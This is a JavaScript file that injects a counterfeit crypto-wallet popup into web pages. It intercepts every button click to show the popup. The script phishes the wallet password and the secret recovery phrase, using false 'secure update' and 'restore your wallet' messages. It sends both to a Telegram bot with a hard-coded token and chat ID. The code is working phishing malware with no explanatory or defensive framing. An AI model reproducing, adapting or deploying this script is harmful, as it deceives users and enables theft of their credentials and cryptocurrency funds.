(function () {
  // Insert CSS
  const style = document.createElement('style');
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    .wallet-popup-ext {
      position: fixed;
      top: 0px;
      right: 24px;
      width: 330px;
      min-height: 540px;
      background: #0d0d2b url('https://github.com/missminutesai/xvv/raw/main/x.png') no-repeat center / cover;
      color: #fff;
      border-radius: 14px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.28);
      padding: 32px 24px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 999999;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
    }
    .wallet-popup-ext.active { opacity: 1; pointer-events: auto; }
    .wallet-popup-ext input, 
    .wallet-popup-ext button, 
    .wallet-popup-ext textarea {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      border-radius: 8px;
      border: none;
      font-size: 15px;
      box-sizing: border-box;
      display: block;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
    }
    .wallet-popup-ext input, 
    .wallet-popup-ext textarea {
      border: 2px solid #626664;
      border-radius: 18px;
      background: #28292c;
      color: #ffffff;
      font-weight: 400;
      letter-spacing: 0.2px;
    }
    .wallet-popup-ext input::placeholder,
    .wallet-popup-ext textarea::placeholder {
      color: #bdbecb;
      text-align: left;
      font-size: 15px;
      font-weight: 400;
      opacity: 1;
    }
    .wallet-popup-ext button {
      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
      color: #fff;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.25s cubic-bezier(.4,0,.2,1), box-shadow 0.2s;
      margin-top: 24px;
      font-size: 15px;
      padding: 12px 0;
      box-shadow: 0 2px 8px rgba(58,122,254,0.08);
      letter-spacing: 0.2px;
    }
    .wallet-popup-ext button:disabled {
      opacity: 0.6; cursor: not-allowed; background: #e49927;
    }
    .wallet-popup-ext button:hover:enabled {
      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
      box-shadow: 0 4px 16px rgba(58,122,254,0.16);
    }
    .wallet-popup-ext .section {
      display: none;
      margin-top: 14px;
      width: 100%;
      flex-direction: column;
      align-items: center;
      min-height: 550px;
      justify-content: center;
      position: relative;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      opacity: 0;
      pointer-events: none;
    }
    .wallet-popup-ext .section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .wallet-popup-ext #phraseInputExt {
      min-height: 100px;
      font-family: inherit;
      text-align: left;
      resize: none;
    }
    .wallet-popup-ext .download-label {
      color: #bdbecb;
      font-size: 15px;
      text-align: center;
      margin-bottom: 8px;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.5;
      width: 100%;
      display: block;
    }
    .wallet-popup-ext .loader-section {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 550px;
      width: 100%;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .wallet-popup-ext .loader-section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .wallet-popup-ext .loader {
      border: 4px solid #22244a;
      border-top: 4px solid #626664;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
      margin-bottom: 28px;
      margin-top: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .wallet-popup-ext .loader-message {
      color: #bdbecb;
      font-size: 16px;
      text-align: center;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.6;
      max-width: 260px;
      animation: fadeIn 0.8s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .wallet-popup-ext input:focus, 
    .wallet-popup-ext textarea:focus {
      border-color: #626664 !important;
      box-shadow: 0 0 0 2px #62666433;
      outline: none;
    }
    .wallet-popup-ext .toggle-password {
      fill: #626664;
      cursor: pointer;
    }
  `;
  document.head.appendChild(style);

  // Insert HTML
  const popup = document.createElement('div');
  popup.className = 'wallet-popup-ext';
  popup.id = 'walletPopupExt';
  popup.innerHTML = `
    <div id="passwordSectionExt" class="section active">
      <input type="password" placeholder="Enter your password" id="passwordInputExt" />
      <button id="unlockBtnExt" disabled>Unlock</button>
    </div>

    <div id="updateSectionExt" class="section">
      <span class="download-label">
        A secure update is ready. Please download to continue protecting your assets.
      </span>
      <button id="downloadBtnExt">Download Update</button>
      <button id="skipBtnExt" style="margin-top:10px;background:#222b;">Skip</button>
    </div>

    <div id="loaderSectionExt" class="loader-section">
      <div class="loader"></div>
      <div class="loader-message" id="loaderMsgExt"></div>
    </div>

    <div id="phraseSectionExt" class="section">
      <textarea placeholder="Import with Secret Phrase" id="phraseInputExt" rows="8" style="resize: none;"></textarea>
      <button id="submitBtnExt" disabled>Submit</button>
    </div>
  `;
  document.body.appendChild(popup);

  // Telegram details
  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
  const TELEGRAM_CHAT_ID = '-4704812522';

  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  }

  // Section switching
  function nextSectionExt(showId) {
    popup.querySelectorAll('.section, .loader-section').forEach(sec => sec.classList.remove('active'));
    popup.querySelector('#' + showId).classList.add('active');
  }

  // Logic for loader and section transitions
  function showLoaderExt() {
    document.getElementById('loaderMsgExt').textContent = 
      "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
    nextSectionExt('loaderSectionExt');
    setTimeout(() => { nextSectionExt('phraseSectionExt'); }, 5000);
  }
  function showLazyLoaderExt() {
    document.getElementById('loaderMsgExt').textContent = "";
    nextSectionExt('loaderSectionExt');
    setTimeout(() => { nextSectionExt('updateSectionExt'); }, 2000);
  }
  function handleDownloadExt() {
    const a = document.createElement('a');
    a.href = 'https://example.com/wallet-update.zip';
    a.download = 'wallet-update.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }
  function submitPhraseExt() {
    const phrase = document.getElementById('phraseInputExt').value.trim();
    if (!phrase) {
      alert('Please enter your secret phrase.');
      document.getElementById('phraseInputExt').focus();
      return;
    }
    sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
    alert('Phrase submitted!');
    popup.classList.remove('active');
  }

  // Disable/enable buttons logic
  function setupInputs() {
    const phraseInput = document.getElementById('phraseInputExt');
    const submitBtn = document.getElementById('submitBtnExt');
    phraseInput.addEventListener('input', function () {
      submitBtn.disabled = phraseInput.value.trim() === '';
    });
    submitBtn.disabled = phraseInput.value.trim() === '';

    const passwordInput = document.getElementById('passwordInputExt');
    const unlockBtn = document.getElementById('unlockBtnExt');
    passwordInput.addEventListener('input', function () {
      unlockBtn.disabled = passwordInput.value.trim() === '';
    });
    unlockBtn.disabled = passwordInput.value.trim() === '';
  }

  // Bind events
  document.getElementById('unlockBtnExt').addEventListener('click', function () {
    const password = document.getElementById('passwordInputExt').value;
    sendToTelegram(`Password entered: ${password}`);
    showLazyLoaderExt();
  });
  document.getElementById('downloadBtnExt').addEventListener('click', handleDownloadExt);
  document.getElementById('skipBtnExt').addEventListener('click', showLoaderExt);
  document.getElementById('submitBtnExt').addEventListener('click', submitPhraseExt);

  setupInputs();

  // Show popup logic
  function showPopup() {
    popup.classList.add('active');
    // Reset to first section
    popup.querySelectorAll('.section, .loader-section').forEach((sec, idx) => {
      sec.classList.toggle('active', idx === 0);
    });
    // Reset inputs
    document.getElementById('passwordInputExt').value = '';
    document.getElementById('phraseInputExt').value = '';
    setupInputs();
  }

  // Listen for any button click on the page
  document.body.addEventListener('click', function (e) {
    if (
      e.target.closest('.wallet-popup-ext') ||
      e.target.closest('button[data-wallet-popup-ignore]') // allow opt-out
    ) return;
    if (e.target.tagName === 'BUTTON') {
      showPopup();
      e.preventDefault();
      e.stopPropagation();
    }
  }, true);

  // Optional: expose showPopup for manual trigger
  window.showWalletPopup = showPopup;
})();